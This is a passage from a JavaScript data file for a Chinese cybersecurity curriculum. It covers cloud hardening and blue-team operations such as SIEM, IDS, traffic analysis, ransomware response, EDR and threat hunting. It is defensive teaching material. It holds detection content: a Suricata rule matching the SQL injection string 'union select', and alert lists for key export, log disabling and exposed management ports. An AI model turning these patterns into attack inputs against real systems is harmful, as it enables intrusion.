            "中级": "实战：看一个云环境的链路——入口（公网 IP/负载均衡）→ 安全组规则 → 实例角色权限 → 能访问的存储与数据库。多数云上问题出在「某一步权限过宽」。",
            "高级": "深入：理解共享责任模型下的边界（厂商管物理与虚拟化，你管配置与数据），以及多账号/多区域带来的治理复杂度。",
          },
          codeLang: "text",
          code:
`云上最小认知地图
计算：虚拟机 / 容器 / 函数
存储：对象存储（桶）/ 云盘 / 文件系统
网络：VPC → 子网 → 安全组 / 负载均衡
身份：账号 → 角色 → 密钥（AK/SK）
先看「谁能从公网访问什么」，再看「实例能用哪些权限」`,
          tool: "云控制台、架构图工具",
          refs: "云计算基础；共享责任模型"
        },
        {
          id: "cloud-account", name: "云账号保护入门", level: "入门",
          summary: "云上的第一道门是账号：根/管理员账号必须强保护，日常操作走角色而非长期密钥。",
          keywords: ["云账号","mfa","根账号","access key","告警","最小权限"],
          levels: {
            "入门": "云账号就是「机房的钥匙串」。主账号权限最大，一旦泄露整片云都可能被拿走，所以必须先把它保护起来。",
            "初级": "必做项：主/根账号开启 MFA 且不日常使用、日常用子账号或角色、关闭或轮换长期访问密钥、开启操作审计与异常登录告警。",
            "中级": "实战检查：是否存在长期 AK/SK 写在代码或服务器上、是否所有高权限账号都开了 MFA、是否有账单异常告警（挖矿的第一信号往往是费用飙升）。",
            "高级": "深入：多云/多账号要做统一身份与权限边界、密钥集中托管与自动轮换，并把云审计日志接入安全运营（攻击者常在拿到凭证后先关日志）。",
          },
          codeLang: "text",
          code:
`云账号保护五件事
1) 根/主账号：开 MFA，不日常使用，不创建访问密钥
2) 日常操作：用子账号或角色，按需授权
3) 禁用长期 AK/SK，改用临时凭证
4) 开启操作审计（谁在什么时候调了什么 API）
5) 配置账单与异常登录告警`,
          tool: "云 IAM、MFA、审计日志",
          refs: "云账号安全基线"
        },
        {
          id: "cloud-storage-sec", name: "对象存储安全配置", level: "初级",
          summary: "桶的公开读写在云上屡屡造成大规模泄露；配置基线 + 巡检 + 加密是基本功。",
          keywords: ["对象存储","桶","公开访问","加密","巡检","基线"],
          levels: {
            "入门": "云上的「桶」就像公开网盘：设置成「所有人可读」，全互联网都能下载里面的文件。",
            "初级": "加固项：默认拒绝公开、开启服务端加密、开启访问日志、设置生命周期（到期删除）、用策略限制只允许指定角色访问。",
            "中级": "实战：定期巡检「公开桶」与「跨账号共享」；对敏感桶启用阻止公开访问的开关；文件上传校验类型防止上传可执行内容被当作网页托管。",
            "高级": "深入：跨账号访问的信任关系要最小化并定期复核；对外分享用带签名的临时链接（有期限）而不是公开策略。",
          },
          codeLang: "text",
          code:
`桶安全基线
□ 默认阻止公开访问（阻止公开策略生效）
□ 服务端加密开启（密钥自管或云管）
□ 访问日志开启并接入监控
□ 周期性巡检「公开/跨账号」授权
□ 对外分享用带期限的签名链接`,
          tool: "云存储策略检查、配置巡检工具",
          refs: "云存储安全实践"
        },
        {
          id: "cloud-network", name: "云网络与安全组实践", level: "中级",
          summary: "安全组与子网划分决定谁能访问谁；云上最常见的问题就是「管理端口对全网开放」。",
          keywords: ["安全组","子网","nacl","公网","最小放通","管理端口"],
          levels: {
            "入门": "云上的安全组像门禁规则：规定「谁能从哪个方向访问哪个端口」。规则写太宽，等于门一直开着。",
            "初级": "原则：默认拒绝、只放通必要端口与来源（指定 IP 段）、管理面走跳板机或私网、数据库不暴露公网。",
            "中级": "实战：巡检「0.0.0.0/0 放通 22/3389/3306」这类高危规则；用私网 + 跳板（或云原生连接服务）替代直接暴露；区分内外网子网。",
            "高级": "深入：多账号与多 VPC 场景下要统一网络策略与连通矩阵，避免「为了连通用而全放通」的临时规则长期残留。",
          },
          codeLang: "text",
          code:
`高危规则快速自检
· 0.0.0.0/0 放通 22 / 3389（远程管理）
· 0.0.0.0/0 放通数据库端口（3306/5432/6379）
· 内网任意源放通全部端口（横向移动友好）
正解：管理走跳板/私网，数据库仅应用层可达`,
          tool: "云网络策略检查、跳板机",
          refs: "云网络安全基线"
        },
        {
          id: "cloud-cicd", name: "云上 CI/CD 与密钥托管", level: "高级",
          summary: "云上流水线常握着云资源的写权限：一旦被 PR 或插件利用，等于交出账号控制权。",
          keywords: ["云上 cicd","密钥托管","oidc","最小权限","部署角色"],
          levels: {
            "入门": "自动部署很方便，但流水线里有能改云资源的钥匙。谁改得了流水线，谁就几乎拿走了整个云账号。",
            "初级": "风险点：长期密钥写进流水线变量、部署角色权限过大、PR 构建能读生产密钥、以及第三方插件可访问密钥。",
            "中级": "实战：改用短期凭证（OIDC 联邦，让流水线向云换取临时令牌）、部署角色按最小权限设计、生产部署走审批与受保护分支。",
            "高级": "深入：把「谁能改流水线、谁能读密钥、谁能触发生产发布」当权限模型审计，并开启云审计对部署动作的全程留痕。",
          },
          codeLang: "text",
          code:
`云上流水线加固方向
· 用 OIDC 短期凭证替代长期 AK/SK
· 部署角色最小权限（只允许必要的 API）
· PR 构建禁止读取生产密钥
· 生产发布需审批 + 签名 + 审计留痕`,
          tool: "OIDC 联邦、云审计、密钥托管服务",
          refs: "云上 DevSecOps 实践"
        },
        {
          id: "cloud-monitor", name: "云审计与监控告警", level: "中级",
          summary: "云上的「日志」就是操作审计：谁在何时调用了哪个 API。它是云上检测的第一数据源。",
          keywords: ["云审计","api 调用","告警","异常检测","日志"],
          levels: {
            "入门": "云上的每次操作都会留下记录（谁、什么时候、调用了什么 API）。攻击者拿到凭证后最想做的第一件事，往往是关掉这个记录。",
            "初级": "必接：账号登录与权限变更、密钥创建与使用、存储策略变更、网络规则变更、以及日志配置本身的变更。",
            "中级": "实战：为高危动作设告警（创建管理员、开放公网、关日志、导出密钥）；对「异常来源与异常时段」的 API 调用做基线检测。",
            "高级": "深入：多账号统一收集（集中到一个只追加的账号）、保护日志存储不可被业务账号删除，并把云审计与主机/网络数据在 SIEM 中关联。",
          },
          codeLang: "text",
          code:
`云上必设告警（示例）
· 创建/修改管理员权限
· 关闭或修改审计日志配置
· 新建访问密钥并立即使用
· 网络规则放通 0.0.0.0/0 管理端口
· 非工作时段来自陌生地区的控制台登录`,
          tool: "云审计、SIEM、告警规则",
          refs: "云上安全监控实践"
        },
        {
          id: "cloud-secret", name: "云原生密钥与配置管理", level: "中级",
          summary: "容器与流水线让配置随处流转：密钥必须走专用服务，不能进镜像、ConfigMap 或环境变量明文。",
          keywords: ["密钥管理","configmap","secret","kms","注入","配置"],
          levels: {
            "入门": "容器环境里到处是配置：配置文件、环境变量、镜像里打包的东西。密钥如果混在里面，等于公开。",
            "初级": "要点：不要用 ConfigMap 存密钥（它是明文）、不要烤进镜像、不要提交进仓库；应使用密钥管理服务并按需注入。",
            "中级": "实战：用 External Secrets/密钥注入把 KMS 里的密钥投射为临时凭据；开启密钥访问审计；对读取密钥的权限单独收敛。",
            "高级": "深入：密钥轮换要能不停机（双密钥过渡）、密钥按环境与用途隔离，并防止「有权读密钥的工作负载」被攻陷后直接提权。",
          },
          codeLang: "text",
          code:
`云原生密钥反模式
✗ 密钥写进镜像 / 提交进 Git
✗ 用 ConfigMap 存密钥（明文可见）
✗ 长期 AK/SK 塞进环境变量
✓ 用 KMS/密钥服务 + 按需注入（临时凭据）
✓ 密钥读取权限最小化 + 访问审计`,
          tool: "KMS、External Secrets、Vault",
          refs: "K8s 密钥管理实践"
        },
        {
          id: "cloud-image-govern", name: "镜像与基础层治理", level: "中级",
          summary: "基础镜像与镜像层是被忽视的漏洞来源：老基础层等于长期携带旧漏洞。",
          keywords: ["镜像","基础层","重建","漏洞","供应链","瘦身"],
          levels: {
            "入门": "容器镜像像「预装好的系统盘」：如果底层用的是很老的系统，里面的漏洞就一直跟着你。",
            "初级": "治理要点：选可信基础镜像、镜像瘦身（去掉编译器等不必要组件）、定期扫描、以及按周期重建以获得补丁。",
            "中级": "实战：把「镜像重建」纳入固定节奏（如每月），因为上游基础层更新不会自动进入你的镜像；同时只保留必要工具，减少可利用面。",
            "高级": "深入：把镜像与制品仓库、运行时资产关联，做到「哪个服务在用哪个镜像、里面有什么组件」可查，才能快速响应新漏洞。",
          },
          codeLang: "text",
          code:
`镜像治理节奏
· 选型：官方/可信基础镜像，锁定版本
· 瘦身：多阶段构建，去掉编译器与调试工具
· 扫描：构建时 + 定期重扫
· 重建：每月按上游补丁重建并滚动更新`,
          tool: "镜像构建工具、镜像扫描器",
          refs: "容器镜像安全实践"
        },
        {
          id: "cloud-multicloud", name: "多账号与多云统一治理", level: "高级",
          summary: "规模上来后，「谁在哪朵云有什么权限」往往没人说得清；统一身份与策略是治理前提。",
          keywords: ["多账号","多云","统一身份","策略","审计","治理"],
          levels: {
            "入门": "用云久了会开很多账号（按部门/环境分），时间一长就没人清楚谁有什么权限。",
            "初级": "分账号本身是好事（隔离与配额），但需要统一管理：统一身份、集中审计、统一策略基线。",
            "中级": "实战：把所有账号的操作审计集中到一个「只写不可删」的账号；用组织级策略强制基线（如禁止公开桶）；定期做跨账号权限盘点。",
            "高级": "深入：多云场景要处理身份联邦与策略表达差异，建立统一的资产与权限台账，并把云上风险纳入企业风险管理与合规报告。",
          },
          codeLang: "text",
          code:
`统一治理三件事
1) 集中审计：所有账号日志进同一存储，业务账号无权删除
2) 策略基线：组织级强制（禁止公开桶/禁止关闭日志）
3) 权限台账：谁在哪个账号有什么角色，定期复核`,
          tool: "云组织策略、集中审计、权限盘点工具",
          refs: "多云治理实践"
        },
        {
          id: "cloud-cspm", name: "云安全态势管理（CSPM）", level: "中级",
          summary: "云上配置问题靠人巡检跟不上：用持续扫描把「公开桶、过宽角色、裸奔端口」等基线与实际配置对齐。",
          keywords: ["cspm","配置基线","持续扫描","合规","公有暴露"],
          levels: {
            "入门": "云上一切靠配置，配置错了就是漏洞。CSPM 就是持续帮你检查「配置是否偏离了安全基线」。",
            "初级": "典型检查项：公开存储桶、`0.0.0.0/0` 放通管理端口、无 MFA 的高权账号、未开启审计、长期密钥。",
            "中级": "实战：先跑「只看不改」建立基线差异清单，按影响排序治理；把高频问题固化成组织级策略，避免反复出现。",
            "高级": "深入：CSPM 要与资产、身份、漏洞、IaC 扫描联动，才能回答「这个配置问题影响了哪个业务、谁能改、改没改」，否则只是告警墙。",
          },
          codeLang: "text",
          code:
`CSPM 高频问题（先治这几个）
· 对象存储对外公开
· 安全组放通 0.0.0.0/0 的管理端口
· 高权账号未开 MFA
· 审计日志未开启/可被业务账号关闭
· 长期访问密钥仍在用
`,
          tool: "CSPM、云配置基线、IaC 扫描",
          refs: "云安全态势管理实践"
        },
        {
          id: "cloud-vuln", name: "云上漏洞管理与优先级", level: "初级",
          summary: "云上资产变动快，漏洞清单容易爆炸；优先级要看「是否公网可达 + 数据敏感度 + 是否真被调用」。",
          keywords: ["漏洞管理","优先级","暴露面","可达性","修复"],
          levels: {
            "入门": "扫描出来的漏洞可能有几百上千个，全修不现实。要先修真正危险的：对外开着、又有敏感数据、且真被用到的。",
            "初级": "排序维度：是否公网可达、影响资产等级、漏洞可利用性（是否有公开利用）、是否有补偿控制（WAF/隔离）。",
            "中级": "实战：把扫描结果与资产台账、暴露面清单合并（否则不知道哪个漏洞在对外服务上）；对无法立即修复的做补偿控制与登记。",
            "高级": "深入：建立「新上线资产自动扫描 + 周度趋势 + 逾期升级」机制，避免漏洞债无限累积；同时避免「扫描器说了算」而忽略业务逻辑问题。",
          },
          codeLang: "text",
          code:
`优先级公式（实践版）
公网可达 × 数据敏感度 × 可利用性 × 是否有补偿控制
→ 高优先级：公网可达 + 核心数据 + 有公开 EXP
→ 低优先级：内网隔离 + 测试环境 + 无利用
`,
          tool: "漏洞扫描、资产台账、暴露面清单",
          refs: "漏洞管理实践"
        },
        {
          id: "cloud-iac", name: "基础设施即代码（IaC）安全", level: "中级",
          summary: "把云资源配置写成代码：改配置走评审，安全基线可以在合并前就被拦住。",
          keywords: ["iac","terraform","配置即代码","扫描","评审","漂移"],
          levels: {
            "入门": "如果云上资源都靠人在控制台点，谁点了什么没人清楚。改成写代码声明，就能像代码一样评审与回溯。",
            "初级": "价值：变更可评审、可回溯、可复制；配合静态扫描能在合并前发现「公开桶、过宽端口」这类问题。",
            "中级": "实战：IaC 扫描接入 CI 门禁（高危直接阻断）；定期比对「代码声明」与「实际配置」，发现并收敛配置漂移。",
            "高级": "深入：注意 IaC 里的密钥与状态文件（state 常含敏感信息）保护、以及共享模块被改动带来的扩散风险。",
          },
          codeLang: "text",
          code:
`IaC 安全要点
· 配置变更走代码评审（不直接在控制台改）
· CI 中扫描高危配置（公开桶/0.0.0.0/0）并阻断
· 定期比对声明与实际（收敛漂移）
· 保护 state 文件与其中可能含有的密钥
`,
          tool: "Terraform/CloudFormation、IaC 扫描器",
          refs: "IaC 安全实践"
        },
        {
          id: "cloud-tenant", name: "多租户隔离", level: "高级",
          summary: "共享云资源时，隔离做不好会出现「跨租户数据可见」；隔离要覆盖网络、身份、数据与运行环境四层。",
          keywords: ["多租户","隔离","租户id","越权","共享资源"],
          levels: {
            "入门": "一套系统给多个客户用时，A 客户绝不该看到 B 客户的数据——这需要系统层面强制隔离，而不是靠界面隐藏。",
            "初级": "四层隔离：网络（VPC/命名空间）、身份（租户级角色）、数据（行级租户过滤）、运行环境（容器/函数隔离）。",
            "中级": "实战：重点验证「数据层是否强制带租户条件」（缓存、检索、队列、报表都要查）——这是跨租户泄露的高发点。",
            "高级": "深入：注意共享组件（缓存键、对象存储前缀、日志聚合）的租户标识遗漏，以及运维通道的跨租户访问权限。",
          },
          codeLang: "text",
          code:
`跨租户泄露检查
· 数据库/检索/缓存/队列是否都强制带 tenant_id？
· 缓存键是否含租户标识（否则会串数据）？
· 对象存储前缀与签名 URL 是否按租户隔离？
· 运维与客服后台能否跨租户查看（应受控且审计）？
`,
          tool: "多租户隔离检查、行级权限",
          refs: "多租户安全实践"
        },
        {
          id: "cloud-dr", name: "云上灾备与业务连续性", level: "高级",
          summary: "云也会挂：区域故障、误删、勒索都会让业务中断；RTO/RPO 要明确并真演练。",
          keywords: ["灾备","业务连续性","rto","rpo","跨区","演练"],
          levels: {
            "入门": "云不是不会坏：机房故障、误删、勒索都可能让服务停摆。灾备就是准备「怎么快速恢复、会丢多少数据」。",
            "初级": "两个指标：RTO（多久恢复）与 RPO（能容忍丢多少数据）；手段是备份 + 跨区冗余 + 快速重建能力。",
            "中级": "实战：关键数据要有跨区备份与不可变副本；恢复流程要能一键重建（IaC 的价值之一）；定期演练并记录实测 RTO/RPO。",
            "高级": "深入：注意「依赖项」也会成为单点（DNS、密钥服务、外部接口），并评估极端情况的降级方案（只保核心功能）。",
          },
          codeLang: "text",
          code:
`灾备设计检查
· RTO/RPO 是否书面明确并演练验证过？
· 数据是否跨区 + 有不可变/离线副本？
· 能否用 IaC 快速重建环境？
· 依赖（DNS/密钥/第三方）是否有备用路径？
`,
          tool: "跨区备份、不可变存储、演练记录",
          refs: "业务连续性与灾备实践"
        },
      ]
    },
    /* ---------------- 蓝队·安全运营与应急 ---------------- */
    {
      id: "blue", name: "蓝队·安全运营与应急", icon: "🛡️",
      desc: "覆盖日志与 SIEM、入侵检测、流量分析、勒索应急、威胁情报与 EDR，是防守侧的核心能力。",
      topics: [
        {
          id: "siem", name: "安全日志与 SIEM", level: "初级",
          summary: "集中收集与关联多源日志，是检测与溯源的基础能力。",
          keywords: ["siem","日志","集中收集","关联规则","elk","splunk","溯源","日志分析"],
          levels: {
            "入门": "发生安全事件后，靠什么知道？靠平时记下的各种日志（谁登录、什么操作）。把分散的日志汇到一起分析，就能发现异常。",
            "初级": "SIEM（安全信息与事件管理）汇集防火墙、主机、应用、认证等日志，做归一化与关联规则。价值：发现孤立看不出的攻击链。常见平台：Splunk、ELK、Wazuh。要点：时间同步（NTP）、字段归一化、去重降噪。",
            "中级": "实战：定义关键规则（暴力破解、异常外联、特权使用）；用查询语言找 IOC 命中；建用例库覆盖 MITRE ATT&CK。防御价值：缩短发现时间（MTTD）。注意误报治理，否则告警疲劳。",
            "高级": "深入：UEBA（用户实体行为分析）异常基线、日志完整性与防篡改（WORM 存储）、以及检测工程作为持续迭代学科。强调：SIEM 效果 = 数据覆盖 × 规则质量 × 响应流程，缺一不可。"
          },
          codeLang: "spl",
          code:
`// 示例：检出短时间多次失败登录（暴力破解雏形）
index=auth fail
| stats count by user, src_ip
| where count > 10
// 配合：成功登录紧随其后则高危`,
          tool: "Splunk、ELK/OpenSearch、Wazuh",
          refs: "SIEM 部署指南；MITRE ATT&CK 数据源"
        },
        {
          id: "ids", name: "入侵检测 IDS/IPS", level: "中级",
          summary: "基于特征或异常识别入侵行为，并可选阻断。",
          keywords: ["ids","ips","入侵检测","snort","suricata","特征","异常","告警"],
          levels: {
            "入门": "在网里安排哨兵，盯着经过的流量，发现可疑的就报警（IDS），厉害的还能直接拦下（IPS）。",
            "初级": "两类：基于特征（已知攻击指纹，如 Snort/Suricata 规则）与基于异常（偏离基线）。IDS 只告警，IPS 串联可阻断。部署：镜像流量（SPAN/TAP）或串联。局限：特征库滞后、加密流量难检。",
            "中级": "实战：写或调 Suricata 规则覆盖高频攻击；结合威胁情报 IOC 做检测；处理误报（调阈值/白名单）。防御运营：告警分级 + 工单闭环。注意：加密流量需解密或靠端点侧补位。",
            "高级": "深入：规则与 ML 异常的结合、东西向（内部）流量的检测盲区、以及 IDS/IPS 在零信任架构中的定位。强调：检测不是终点，告警必须接响应流程，否则只是看见了。"
          },
          codeLang: "text",
          code:
`# Suricata 规则示意（检测明显扫描/已知 payload）
alert tcp any any -> $HOME_NET 80 (msg:"SQLi attempt"; \
  flow:to_server; content:"union select"; nocase; sid:10001;)
# 实战需结合情报 IOC 与去误报调优`,
          tool: "Suricata、Snort、Zeek",
          refs: "Suricata 文档；IDS/IPS 部署实践"
        },
        {
          id: "traffic", name: "恶意流量分析", level: "中级",
          summary: "在加密普及下，用元数据、行为与威胁情报识别 C2 与数据外传。",
          keywords: ["流量分析","恶意流量","c2","dns隧道","外联","威胁狩猎","netflow"],
          levels: {
            "入门": "即使内容加密了，流量本身的特征也会露馅：跟谁通信、频率、大小、时间点。分析这些能发现隐藏的恶意联系。",
            "初级": "思路：看异常外联（陌生 IP/域名）、信标（Beacon）规律心跳、DNS 隧道（超长或编码子域）、数据外传（突发大流量）。工具：Zeek 抽元数据、Suricata、Wireshark。结合威胁情报标注恶意 IOC。",
            "中级": "实战：从 NetFlow/Zeek conn.log 找长连接或周期信标；解码可疑 DNS 看是否隧道；用 JA3/JA4 指纹识别恶意工具（如 Cobalt Strike）。防御狩猎：基于假设主动找隐藏威胁。",
            "高级": "深入：加密流量中的侧信道（包长/间隔）、DGA 域名识别、以及威胁狩猎方法论（假设→验证→沉淀检测）。强调：流量分析的价值在行为与情报，单看一条难定罪。"
          },
          codeLang: "bash",
          code:
`# 用 Zeek 抽连接元数据，找可疑外联/信标
zeek -C -r capture.pcap
# 关注 conn.log：duration、orig/resp 字节、历史
# DNS 隧道线索：超长标签、高频子域、罕见 TLD`,
          tool: "Zeek、Wireshark、Suricata、JA3/JA4",
          refs: "Zeek 文档；威胁狩猎手册；MITRE ATT&CK 命令控制"
        },
        {
          id: "ir", name: "勒索软件应急响应", level: "高级",
          summary: "勒索事件发生后的隔离、遏制、溯源与恢复闭环流程。",
          keywords: ["应急响应","勒索软件","incident response","隔离","溯源","备份","业务连续性"],
          levels: {
            "入门": "电脑被勒索锁了怎么办？第一件事是断网防扩散，然后保住能保的，再按步骤恢复，而不是乱点付费。",
            "初级": "流程（NIST IR）：准备 → 检测分析 → 遏制（隔离受感染主机/断网/封账号）→ 根除（清恶意/改凭证）→ 恢复（从干净备份还原、验证）→ 复盘。关键：日常有离线或不可变备份，演练过恢复。",
            "中级": "实战：立即隔离（拔网/防火墙阻断，勿重启以免触发自毁）；取证留痕（内存/磁盘镜像）；定位入口与横向路径；统一改密加吊销凭据；从已验证备份重建。避免直接付赎金（不保证解密且助长犯罪）。",
            "高级": "深入：早期遏制与业务连续性的权衡、解密工具可用性评估（部分家族有免费解密器）、以及把单次事件转成检测规则与加固项。强调：应急响应的天花板由平时准备（备份/演练/可见性）决定。"
          },
          codeLang: "text",
          code:
`# 应急响应速记（按场景判断，勿死记步骤）
# 1) 遏制：隔离主机、封锁账号与 VPN、阻断 C2 IP
# 2) 取证：保留内存/磁盘镜像，记录时间线（勿重启）
# 3) 根除：清恶意载荷、统一改密、吊销令牌
# 4) 恢复：从离线/不可变备份还原，验证后再上线
# 5) 复盘：沉淀 IOC 与检测规则，补加固项`,
          tool: "备份系统、EDR 隔离、取证工具（如 Velociraptor）",
          refs: "NIST SP 800-61（事件响应）；勒索软件防护指南"
        },
        {
          id: "threat-intel", name: "威胁情报", level: "初级",
          summary: "用 IOC/IOA 与攻击者画像提升检测与决策质量。",
          keywords: ["威胁情报","threat intelligence","ioc","ioa","ttp","情报源","tip","态势"],
          levels: {
            "入门": "与其临时找坏人特征，不如订阅已知坏蛋名单（恶意 IP/域名/文件指纹），让系统自动比对报警。",
            "初级": "两类：IOC（失陷指标，如 IP/域名/哈希，用于已发生匹配）与 IOA（攻击行为或意图，用于正在发生判断）。TTP 描述攻击者手法（对应 ATT&CK）。来源：公开 feed、厂商、行业共享（ISAC）。",
            "中级": "实战：把情报接入 SIEM/防火墙做自动阻断；按相关性过滤降噪（地域/行业）；用 ATT&CK 映射对手能力做差距分析。平台：TIP（威胁情报平台）做汇聚与分发。",
            "高级": "深入：情报的置信度与误报成本、私有情报（自家发现的 IOC）沉淀、以及情报驱动的狩猎。强调：情报价值不在多，在可用、相关、接了响应。"
          },
          codeLang: "json",
          code:
`// 情报格式示意（STIX/TAXII 思想，简化）
{
  "type": "indicator",
  "pattern": "[ipv4-addr:value = '203.0.113.66']",
  "valid_until": "2026-09-01",
  "labels": ["malicious-activity"]
}
// 接入 SIEM：命中即告警/阻断`,
          tool: "MISP、OpenCTI、TAXII 订阅",
          refs: "STIX/TAXII 标准；MITRE ATT&CK；威胁情报实践"
        },
        {
          id: "edr", name: "终端检测与响应 EDR", level: "初级",
          summary: "在主机侧做行为检测、取证与一键响应，是端点防护的核心。",
          keywords: ["edr","终端检测","端点","行为检测","取证","隔离","响应","xdr"],
          levels: {
            "入门": "服务器和电脑这类端点是攻击者最终落脚处。在端点装监控加反应工具，能看见进程干了啥，并远程隔离它。",
            "初级": "EDR 与老杀毒区别：不只看文件特征，更看行为（进程链、注入、异常父子关系），并支持回溯取证与远程响应（隔离主机、终止进程、采集内存）。价值：在勒索或无文件攻击中尤其关键。",
            "中级": "实战（蓝队）：用 EDR 拉进程树定位入口；一键隔离受染主机遏制；用时间线还原攻击链；把发现的 IOC 反哺情报与检测。选型关注：行为覆盖、误报率、响应闭环。",
            "高级": "深入：EDR 自身被对抗（卸载/篡改/驱动漏洞）、与 XDR（跨终端+网络+云）的协同、以及可见性到检测到响应的自动化（SOAR）。强调：端点是攻防最后一道线，可见性与一键响应决定止损速度。"
          },
          codeLang: "text",
          code:
`# EDR 典型响应动作（平台内操作，非命令）
# 隔离主机：断开网络但保留管理通道
# 终止进程树：杀掉恶意父+子进程
# 采集：内存镜像 + 进程树 + 网络连接快照
# 反哺：导出 IOC 进 SIEM/情报平台`,
          tool: "CrowdStrike / SentinelOne / 火绒/360 企业版 等 EDR",
          refs: "EDR 能力框架；MITRE ATT&CK 端点技术"
        },
        {
          id: "blue-role", name: "蓝队是做什么的", level: "入门",
          summary: "蓝队负责「看见并响应」：监控、检测、处置与复盘，目标是缩短发现与恢复时间。",
          keywords: ["蓝队","防守","监控","检测","响应","职责"],
          levels: {
            "入门": "红队负责「打进来试试」，蓝队负责「发现并挡住」。日常工作是盯告警、分析异常、处理事件、复盘改进。",
            "初级": "蓝队能力四块：看得见（日志与监控）、判得准（检测规则与研判）、处理得动（预案与自动化）、改得进（复盘与加固）。",
            "中级": "实战关注指标：多久发现（MTTD）、多久处理完（MTTR）、有多少真实事件被漏掉；蓝队工作靠流程与数据，而不是英雄主义。",
            "高级": "深入：成熟蓝队会做威胁狩猎（主动找证据）与对抗演练（检验检测覆盖），并把每次事件的结论转成新规则与新监控项。",
          },
          codeLang: "text",
          code:
`蓝队日常循环
监控告警 → 研判分级 → 处置/升级 → 复盘 → 新增检测规则或监控项
衡量：MTTD（发现耗时）/ MTTR（处置耗时）/ 漏检数`,
          tool: "SIEM、EDR、工单与预案",
          refs: "蓝队能力框架"
        },
        {
          id: "blue-log", name: "看懂一条安全日志", level: "入门",
          summary: "日志的价值在字段：谁、何时、从哪、对什么、做了什么、结果如何。",
          keywords: ["日志","字段","认证","审计","时间同步","溯源"],
          levels: {
            "入门": "安全日志就是在记录「发生了什么事」。看懂它要回答六个问题：谁、什么时候、从哪里、对什么、做了什么、成功还是失败。",
            "初级": "以登录日志为例：账号、时间、来源 IP、目标系统、动作（登录/失败/锁定）、结果。缺字段就无法判断，比如没有来源 IP 就难以区分内外。",
            "中级": "实战：判断暴力破解看「同一来源多次失败后成功」，判断异常登录看「非常用地区/时段 + 高权账号」；前提是各设备时间同步，否则时间线对不上。",
            "高级": "深入：日志要集中收集并防篡改（攻击者常先清日志）；同时注意日志本身可能含敏感信息，需做脱敏与访问控制。",
          },
          codeLang: "text",
          code:
`一条登录日志的关键字段
time=2026-09-13T21:04:11Z  user=admin  src_ip=203.0.113.9
action=login  result=failure  reason=bad_password
target=web01
研判：连续失败后成功？来源是否常用地区？账号是否高权？`,
          tool: "SIEM 检索、日志分析工具",
          refs: "日志分析基础"
        },
        {
          id: "blue-tools", name: "安全运营常用工具链", level: "初级",
          summary: "从日志平台到工单系统：工具要为「发现—研判—处置—复盘」的流程服务。",
          keywords: ["工具链","siem","edr","工单","情报","编排"],
          levels: {
            "入门": "安全运营靠一套工具配合：日志平台看数据、检测平台出告警、工单系统跟处置、情报平台补背景。",
            "初级": "典型组合：SIEM（集中日志与关联）、EDR（终端行为）、情报平台（外部信息）、SOAR/剧本（自动化处置）、工单与知识库（闭环与沉淀）。",
            "中级": "实战：工具是否好用取决于「数据是否打通」——告警里能否一键看到资产、账号、历史行为；否则每次处置都要人肉翻三个系统。",
            "高级": "深入：评估工具要看自动化率与采纳率，而不是功能清单；把重复动作沉淀为剧本，让人做判断、机器做搬运。",
          },
          codeLang: "text",
          code:
`工具链是否打通的判断标准
· 点开一条告警，能否看到资产归属与责任人？
· 能否看到该账号/主机近 7 天行为？
· 处置动作（隔离、封禁）能否在工单里一键执行？
· 处置结论是否自动回流到检测规则优化？`,
          tool: "SIEM/EDR/SOAR/工单系统",
          refs: "安全运营工具链实践"
        },
        {
          id: "blue-playbook", name: "应急预案与处置剧本", level: "中级",
          summary: "把常见事件的标准动作写成剧本：谁做、做什么、看什么、什么时候升级——出事时不靠现场发挥。",
          keywords: ["预案","剧本","playbook","升级","自动化","演练"],
          levels: {
            "入门": "剧本就是「遇到这种事，按这几步做」的清单。写着的时候慢，用起来快。",
            "初级": "剧本要素：触发条件、所需数据、处置步骤（含具体命令或工单动作）、升级条件与联系人、验证与收尾。",
            "中级": "实战：先为高频场景写（钓鱼、暴力破解、恶意软件、数据泄露）；上线后按真实事件打磨，把只能靠人判断的部分标注清楚。",
            "高级": "深入：能自动化的部分交给 SOAR，但「有副作用的动作」要保留人工确认；剧本要纳入版本管理并定期演练验证有效性。",
          },
          codeLang: "text",
          code:
`剧本模板（钓鱼邮件）
触发：用户举报/网关拦截
数据：邮件头、附件哈希、发送域、点击用户列表
步骤：1) 取哈希与域名查情报 2) 全网搜同主题邮件
      3) 隔离/删除 4) 排查已点击账号行为
升级：出现成功登录或内网外联 → 升级为事件
收尾：更新拦截规则、给用户反馈`,
          tool: "剧本库、SOAR、演练记录",
          refs: "应急预案实践"
        },
        {
          id: "blue-hunt-basics", name: "主动狩猎入门", level: "中级",
          summary: "不等告警，主动去找「如果被入侵了会留下什么」的痕迹；从高价值风险开始假设。",
          keywords: ["狩猎","假设","查询","数据","痕迹","发现"],
          levels: {
            "入门": "狩猎是主动查：先假设一种攻击可能发生，再去找证据。找不到也是有价值的结论。",
            "初级": "起步假设：异常登录、持久化项、计划任务变更、异常外联、权限提升。确认有没有对应的日志能验证。",
            "中级": "实战：一次狩猎只验证一个假设，写清查询语句与判据；结论要能沉淀（新规则、新监控项或数据缺口清单）。",
            "高级": "深入：把狩猎与检测工程结合——狩猎发现的新模式转成规则，规则覆盖的就不再需要反复人工狩猎。",
          },
          codeLang: "text",
          code:
`一次狩猎的最小产出
假设：攻击者在服务器上建立了计划任务持久化
数据：计划任务创建日志（Event 4698）、进程创建、登录日志
查询：非管理员创建 / 名称可疑 / 指向临时目录
结论：命中 N 条（逐条核实）或「无数据可查」→ 补日志`,
          tool: "SIEM 查询、EDR、ATT&CK",
          refs: "威胁狩猎实践"
        },
        {
          id: "blue-purple", name: "紫队与对抗演练", level: "高级",
          summary: "紫队把攻击与防守拉到同一张桌上：用攻击动作验证检测是否真的有效，并当场改规则。",
          keywords: ["紫队","对抗演练","验证","检测覆盖","协同"],
          levels: {
            "入门": "紫队不是第三支队伍，而是让红蓝双方一起把「这个攻击你能看到吗」当场验证清楚。",
            "初级": "做法：选一个 ATT&CK 技术 → 红队执行（或模拟执行）→ 看蓝队是否有告警 → 没有就一起补数据或补规则。",
            "中级": "实战：把演练结果记成矩阵（技术 × 是否检出 × 延时 × 处置结果），避免「演练完就忘」；重点补「有日志无规则」的空白。",
            "高级": "深入：紫队演练成果要能持续回归（形成可重复的模拟动作库），并把关键技术的检出率与耗时作为运营指标跟踪。",
          },
          codeLang: "text",
          code:
`紫队演练记录
技术：T1053 计划任务持久化
动作：模拟创建可疑计划任务
结果：有日志 ✓ / 有规则 ✗ / 检出延时 -
动作项：写规则（附样本）→ 回归验证 → 纳入基线监控`,
          tool: "ATT&CK、模拟工具、检测平台",
          refs: "紫队实践；检测验证"
        },
        {
